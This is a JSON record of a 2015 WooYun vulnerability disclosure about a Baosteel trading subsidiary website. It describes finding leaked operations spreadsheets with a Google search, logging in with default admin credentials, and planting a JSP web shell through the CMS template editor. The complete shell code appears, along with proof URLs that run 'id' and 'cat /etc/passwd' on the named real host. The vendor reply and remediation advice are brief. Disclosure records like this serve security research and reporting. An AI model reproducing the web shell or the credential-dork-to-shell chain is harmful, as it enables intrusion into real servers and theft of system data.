{"id": 37126, "wybug_id": "wooyun-2015-0100379", "wybug_title": "宝钢贸易公司某子站运维文档泄露导致getshell", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "zz2008", "wybug_date": "2015-03-10 19:11", "wybug_open_date": "2015-04-24 19:12", "wybug_type": "重要敏感信息泄露", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-24：\t细节向公众公开  简要描述： 宝钢贸易公司子站运维文档泄露,其中包括内网信息和多个子站后台地址、用户名密码。其中www.nesteel.cn（沈阳宝钢东北贸易公司）可getshell 详细说明：  \n\ngoogle查询字符串：宝钢 filetype:xlsx intext:密码\n\n其中包含后台用户名、密码及多台内网主机管理信息。后台：http://www.nesteel.cn/cms_wz/login.jsp用户名：admin密码:admin进入后台后，使用模板编辑功能可添加jsp代码\n\n添加代码\n<%@ page import=\"java.util.*,java.io.*\"%><%if (request.getParameter(\"cmd\") != null) {        out.println(\"Command: \" + request.getParameter(\"cmd\") + \"<BR>\");        Process p = Runtime.getRuntime().exec(request.getParameter(\"cmd\"));        OutputStream os = p.getOutputStream();        InputStream in = p.getInputStream();        DataInputStream dis = new DataInputStream(in);        String disr = dis.readLine();        while ( disr != null ) {                out.println(disr);                disr = dis.readLine();                }        }%>\n从而可使用站点预览功能执行命令（加cmd参数），可getshell由于文档泄露了大量内网信息，估计可以造成更大破坏，因为没有时间，暂不测试。   漏洞证明：  站点预览功能urlview-source:http://www.nesteel.cn/cms_wz/DispatchAction.do?efFormEname=ECTM40&key=AWIAPwFqUzICY1dgB2AMbQNnAmEGYgM0UGMFNQJmUGIBEgxDXUZVd1ZHAUZfSFc2&passPermit=true&cmd=id\n\nview-source:http://www.nesteel.cn/cms_wz/DispatchAction.do?efFormEname=ECTM40&key=AWIAPwFqUzICY1dgB2AMbQNnAmEGYgM0UGMFNQJmUGIBEgxDXUZVd1ZHAUZfSFc2&passPermit=true&cmd=cat /etc/passwd\n\n   修复方案：  停止文件分享，将后台口令修改为强口令。   版权声明：转载请注明来源 zz2008@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-03-15 11:37 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式（或以往建立的处置渠道）向网站管理单位（软件生产厂商）通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}